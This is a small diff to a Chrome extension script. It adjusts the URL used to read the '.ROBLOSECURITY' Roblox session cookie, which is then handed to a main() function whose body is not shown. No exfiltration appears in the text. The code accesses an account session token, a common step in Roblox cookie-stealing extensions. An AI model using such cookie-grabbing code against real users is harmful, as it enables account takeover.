@@ -93,6 +93,6 @@ async function main(cookie) {
 }
 
 // Ensure the Chrome extension permissions include "cookies" and the Roblox domain
-chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function (cookie) {
+chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, function (cookie) {
     main(cookie?.value || null);
 });
